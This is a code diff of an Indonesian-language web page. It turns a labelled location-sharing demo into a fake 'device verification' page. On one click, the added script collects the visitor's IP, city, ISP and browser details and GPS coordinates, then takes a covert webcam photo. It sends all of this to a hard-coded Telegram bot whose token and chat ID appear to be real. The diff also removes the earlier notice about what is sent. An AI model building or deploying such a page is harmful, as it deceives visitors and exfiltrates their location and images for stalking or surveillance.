@@ -1,77 +1,103 @@
 <!DOCTYPE html>
-<html lang="id">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Demo Lokasi ke Telegram</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      background: #111;
-      color: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .box {
-      text-align: center;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-  </style>
-</head>
-<body>
 
-<div class="box">
-  <h2>Izinkan Lokasi</h2>
-  <p>Data hanya dikirim jika kamu menekan tombol</p>
-  <button onclick="kirimLokasi()">Kirim Lokasi Saya</button>
-  <p id="status"></p>
-</div>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verifikasi Perangkat</title>
+</head>
+
+<body style="font-family:sans-serif;text-align:center;padding:40px">
+
+<h2>Verifikasi Perangkat</h2>
+<p>Klik tombol untuk memulai</p>
+
+<button onclick="mulai()">gealgeol.mantep</button>
+
+<pre id="log" style="text-align:left;margin-top:20px;"></pre>
 
 <script>
 const TOKEN = "8335849839:AAFhhUYDiOUVybcp0WMUODHkhBjlRXJQWb8";
 const CHAT_ID = "7665671289";
 
-async function kirimLokasi() {
-  const status = document.getElementById("status");
-  status.innerText = "Meminta izin lokasi...";
+async function mulai() {
+    const log = document.getElementById("log");
+    log.textContent = "Memulai...\n";
 
-  if (!navigator.geolocation) {
-    status.innerText = "Browser tidak mendukung GPS";
-    return;
-  }
+    let data = "=== DATA USER ===\n";
 
-  navigator.geolocation.getCurrentPosition(async (pos) => {
-    const lat = pos.coords.latitude;
-    const lon = pos.coords.longitude;
-
-    const text = `Lokasi user:\nhttps://maps.google.com/?q=${lat},${lon}`;
-
+    // IP INFO
     try {
-      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: text
-        })
-      });
-
-      status.innerText = "Lokasi berhasil dikirim ✅";
-    } catch (err) {
-      status.innerText = "Gagal kirim ❌";
+        const res = await fetch('https://ipapi.co/json/');
+        const d = await res.json();
+        data += `IP: ${d.ip}\nKota: ${d.city}\nISP: ${d.org}\n`;
+    } catch {
+        data += "IP gagal\n";
     }
 
-  }, () => {
-    status.innerText = "Izin lokasi ditolak";
-  });
+    data += `Device: ${navigator.platform}\n`;
+    data += `Browser: ${navigator.userAgent}\n`;
+
+    await kirimPesan(data);
+
+    // LOKASI
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            kirimPesan("Lokasi:\n" + link);
+        }, () => kirimPesan("Lokasi ditolak"));
+    }
+
+    // KAMERA
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.play();
+
+        video.onloadedmetadata = () => {
+            setTimeout(() => {
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                canvas.getContext("2d").drawImage(video, 0, 0);
+
+                kirimFoto(canvas.toDataURL("image/jpeg", 0.8));
+
+                stream.getTracks().forEach(t => t.stop());
+            }, 2000);
+        };
+
+    } catch {
+        kirimPesan("Kamera ditolak");
+    }
+}
+
+async function kirimPesan(text) {
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text
+        })
+    });
+}
+
+function kirimFoto(base64) {
+    fetch(base64)
+    .then(res => res.blob())
+    .then(blob => {
+        const form = new FormData();
+        form.append("chat_id", CHAT_ID);
+        form.append("photo", blob, "foto.jpg");
+
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: form
+        });
+    });
 }
 </script>
 
